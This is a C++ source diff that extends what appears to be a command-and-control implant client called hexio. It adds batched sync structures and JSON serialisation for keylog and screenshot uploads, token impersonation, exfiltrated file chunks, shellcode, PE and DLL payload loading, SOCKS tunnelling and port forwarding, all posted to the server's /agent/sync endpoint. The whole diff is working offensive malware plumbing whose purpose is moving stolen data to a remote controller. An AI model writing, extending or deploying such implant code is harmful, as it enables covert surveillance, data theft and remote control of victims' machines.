@@ -28,6 +28,7 @@
 #include <string>
 #include <vector>
 #include <map>
+#include <optional>
 #include <cstdint>
 #include <sstream>
 #include <stdexcept>
@@ -180,6 +181,113 @@ struct DownloadInitResponse {
     std::string agent_path;
 };
 
+// --- Sync batch types ---
+
+struct SleepUpdate {
+    int64_t sleep_time = 0;
+    std::optional<int64_t> sleep_jitter;
+};
+
+struct CommandResult {
+    int64_t command_id = 0;
+    std::string command;
+    std::string response;
+};
+
+struct SideChannelResponse {
+    std::string channel_id;
+    std::string data;
+};
+
+struct DownloadInitRequest {
+    std::string file_name;
+    std::string agent_path;
+    int64_t file_size = 0;
+    int64_t chunk_size = 0;
+    int64_t total_chunks = 0;
+};
+
+struct DownloadChunkUpload {
+    std::string download_id;
+    std::string chunk_data;
+};
+
+struct ScreenshotUpload {
+    std::string filename;
+    std::string data;
+};
+
+struct KeylogUpload {
+    std::string filename;
+    std::string data;
+};
+
+struct SocksReceive {
+    std::string id;
+    std::string data;
+};
+
+struct SocksSyncRequest {
+    std::vector<std::string> closes;
+    std::vector<SocksReceive> receives;
+};
+
+struct PortFwdOpenRequest {
+    int64_t port = 0;
+    std::string remote_host;
+    int64_t remote_port = 0;
+};
+
+struct PortFwdSend {
+    std::string sockid;
+    std::string data;
+    int64_t size = 0;
+};
+
+struct PortFwdInboundData {
+    std::vector<std::string> opens;
+    std::vector<PortFwdSend> sends;
+    std::vector<std::string> closes;
+};
+
+struct PortFwdSyncRequestEntry {
+    int64_t port = 0;
+    PortFwdInboundData data;
+};
+
+struct SyncRequest {
+    std::optional<SleepUpdate> sleep;
+    std::optional<std::string> impersonation;
+    std::vector<CommandResult> commands;
+    std::vector<SideChannelResponse> side_channel_responses;
+    std::vector<DownloadInitRequest> download_init;
+    std::vector<DownloadChunkUpload> download_chunk;
+    std::vector<std::string> download_cancel;
+    std::vector<ScreenshotUpload> screenshots;
+    std::optional<KeylogUpload> keylog;
+    std::vector<std::string> bof_files;
+    std::vector<std::string> pe_files;
+    std::vector<std::string> dll_files;
+    std::vector<std::string> elf_files;
+    std::vector<std::string> macho_files;
+    std::vector<std::string> shellcode_files;
+    std::vector<std::string> hexlang;
+    bool socks_open_flag = false;
+    std::optional<int64_t> socks_open_port;
+    bool socks_close_flag = false;
+    std::optional<SocksSyncRequest> socks_sync;
+    std::vector<PortFwdOpenRequest> portfwd_open;
+    std::vector<int64_t> portfwd_close;
+    std::vector<PortFwdSyncRequestEntry> portfwd_sync;
+
+    std::string toJson() const;
+};
+
+struct SyncResponse {
+    std::vector<CommandEntry> commands;
+    std::string rawJson;
+};
+
 class HexioClient {
 public:
     std::string baseUrl;
@@ -194,6 +302,7 @@ public:
     RegisterResponse registerAgent(const RegisterRequest& req);
     CheckinResponse checkinAgent();
     CheckinResponse sync(int64_t sleepTime = -1, int64_t sleepJitter = -1);
+    SyncResponse sync(const SyncRequest& req);
     void commandResponse(int64_t commandId, const std::string& command, const std::string& response);
     DownloadInitResponse downloadInit(const std::string& fileName, const std::string& agentPath, int fileSize, int chunkSize, int totalChunks);
     std::string downloadChunk(const std::string& downloadId, const std::string& chunkDataB64);
@@ -641,6 +750,221 @@ void HexioClient::portfwdClose(int64_t port) {
 
 std::string HexioClient::portfwdSync(const std::string& jsonBody) {
     return request("POST", "/agent/portfwd/sync", jsonBody);
+}
+
+// --- SyncRequest serialization ---
+
+namespace detail {
+
+inline std::string buildStringArray(const std::vector<std::string>& items) {
+    json::Array a;
+    for (const auto& s : items) a.add(s);
+    return a.build();
+}
+
+inline std::string buildIntArray(const std::vector<int64_t>& items) {
+    std::ostringstream ss;
+    ss << "[";
+    for (size_t i = 0; i < items.size(); i++) {
+        if (i) ss << ",";
+        ss << items[i];
+    }
+    ss << "]";
+    return ss.str();
+}
+
+inline std::string buildObjArray(const std::vector<std::string>& objs) {
+    std::ostringstream ss;
+    ss << "[";
+    for (size_t i = 0; i < objs.size(); i++) {
+        if (i) ss << ",";
+        ss << objs[i];
+    }
+    ss << "]";
+    return ss.str();
+}
+
+} // namespace detail
+
+std::string SyncRequest::toJson() const {
+    json::Object root;
+
+    if (sleep.has_value()) {
+        json::Object s;
+        s.add("sleep_time", sleep->sleep_time);
+        if (sleep->sleep_jitter.has_value()) s.add("sleep_jitter", *sleep->sleep_jitter);
+        root.addRaw("sleep", s.build());
+    }
+
+    if (impersonation.has_value()) {
+        root.add("impersonation", *impersonation);
+    }
+
+    if (!commands.empty()) {
+        std::vector<std::string> objs;
+        objs.reserve(commands.size());
+        for (const auto& c : commands) {
+            objs.push_back(json::Object()
+                .add("command_id", c.command_id)
+                .add("command", c.command)
+                .add("response", c.response)
+                .build());
+        }
+        root.addRaw("commands", detail::buildObjArray(objs));
+    }
+
+    if (!side_channel_responses.empty()) {
+        std::vector<std::string> objs;
+        objs.reserve(side_channel_responses.size());
+        for (const auto& s : side_channel_responses) {
+            objs.push_back(json::Object()
+                .add("channel_id", s.channel_id)
+                .add("data", s.data)
+                .build());
+        }
+        root.addRaw("side_channel_responses", detail::buildObjArray(objs));
+    }
+
+    if (!download_init.empty()) {
+        std::vector<std::string> objs;
+        objs.reserve(download_init.size());
+        for (const auto& d : download_init) {
+            objs.push_back(json::Object()
+                .add("file_name", d.file_name)
+                .add("agent_path", d.agent_path)
+                .add("file_size", d.file_size)
+                .add("chunk_size", d.chunk_size)
+                .add("total_chunks", d.total_chunks)
+                .build());
+        }
+        root.addRaw("download_init", detail::buildObjArray(objs));
+    }
+
+    if (!download_chunk.empty()) {
+        std::vector<std::string> objs;
+        objs.reserve(download_chunk.size());
+        for (const auto& d : download_chunk) {
+            objs.push_back(json::Object()
+                .add("download_id", d.download_id)
+                .add("chunk_data", d.chunk_data)
+                .build());
+        }
+        root.addRaw("download_chunk", detail::buildObjArray(objs));
+    }
+
+    if (!download_cancel.empty()) {
+        root.addRaw("download_cancel", detail::buildStringArray(download_cancel));
+    }
+
+    if (!screenshots.empty()) {
+        std::vector<std::string> objs;
+        objs.reserve(screenshots.size());
+        for (const auto& s : screenshots) {
+            objs.push_back(json::Object()
+                .add("filename", s.filename)
+                .add("data", s.data)
+                .build());
+        }
+        root.addRaw("screenshots", detail::buildObjArray(objs));
+    }
+
+    if (keylog.has_value()) {
+        root.addRaw("keylog", json::Object()
+            .add("filename", keylog->filename)
+            .add("data", keylog->data)
+            .build());
+    }
+
+    if (!bof_files.empty())       root.addRaw("bof_files",       detail::buildStringArray(bof_files));
+    if (!pe_files.empty())        root.addRaw("pe_files",        detail::buildStringArray(pe_files));
+    if (!dll_files.empty())       root.addRaw("dll_files",       detail::buildStringArray(dll_files));
+    if (!elf_files.empty())       root.addRaw("elf_files",       detail::buildStringArray(elf_files));
+    if (!macho_files.empty())     root.addRaw("macho_files",     detail::buildStringArray(macho_files));
+    if (!shellcode_files.empty()) root.addRaw("shellcode_files", detail::buildStringArray(shellcode_files));
+    if (!hexlang.empty())         root.addRaw("hexlang",         detail::buildStringArray(hexlang));
+
+    if (socks_open_flag) {
+        root.addRaw("socks_open", "{}");
+    }
+    if (socks_open_port.has_value()) {
+        root.add("socks_open_port", *socks_open_port);
+    }
+    if (socks_close_flag) {
+        root.addRaw("socks_close", "{}");
+    }
+
+    if (socks_sync.has_value()) {
+        json::Object inner;
+        bool added = false;
+        if (!socks_sync->closes.empty()) {
+            inner.addRaw("closes", detail::buildStringArray(socks_sync->closes));
+            added = true;
+        }
+        if (!socks_sync->receives.empty()) {
+            std::vector<std::string> objs;
+            objs.reserve(socks_sync->receives.size());
+            for (const auto& r : socks_sync->receives) {
+                objs.push_back(json::Object().add("id", r.id).add("data", r.data).build());
+            }
+            inner.addRaw("receives", detail::buildObjArray(objs));
+            added = true;
+        }
+        root.addRaw("socks_sync", added ? inner.build() : "{}");
+    }
+
+    if (!portfwd_open.empty()) {
+        std::vector<std::string> objs;
+        objs.reserve(portfwd_open.size());
+        for (const auto& p : portfwd_open) {
+            objs.push_back(json::Object()
+                .add("port", p.port)
+                .add("remote_host", p.remote_host)
+                .add("remote_port", p.remote_port)
+                .build());
+        }
+        root.addRaw("portfwd_open", detail::buildObjArray(objs));
+    }
+
+    if (!portfwd_close.empty()) {
+        root.addRaw("portfwd_close", detail::buildIntArray(portfwd_close));
+    }
+
+    if (!portfwd_sync.empty()) {
+        std::vector<std::string> entries;
+        entries.reserve(portfwd_sync.size());
+        for (const auto& pe : portfwd_sync) {
+            json::Object inner;
+            if (!pe.data.opens.empty())  inner.addRaw("opens",  detail::buildStringArray(pe.data.opens));
+            if (!pe.data.sends.empty()) {
+                std::vector<std::string> sobjs;
+                sobjs.reserve(pe.data.sends.size());
+                for (const auto& s : pe.data.sends) {
+                    sobjs.push_back(json::Object()
+                        .add("sockid", s.sockid)
+                        .add("data", s.data)
+                        .add("size", s.size)
+                        .build());
+                }
+                inner.addRaw("sends", detail::buildObjArray(sobjs));
+            }
+            if (!pe.data.closes.empty()) inner.addRaw("closes", detail::buildStringArray(pe.data.closes));
+            entries.push_back(json::Object()
+                .add("port", pe.port)
+                .addRaw("data", inner.build())
+                .build());
+        }
+        root.addRaw("portfwd_sync", detail::buildObjArray(entries));
+    }
+
+    return root.build();
+}
+
+SyncResponse HexioClient::sync(const SyncRequest& req) {
+    std::string body = req.toJson();
+    auto resp = request("POST", "/agent/sync", body);
+    SyncResponse sr;
+    sr.rawJson = resp;
+    return sr;
 }
 
 } // namespace hexio
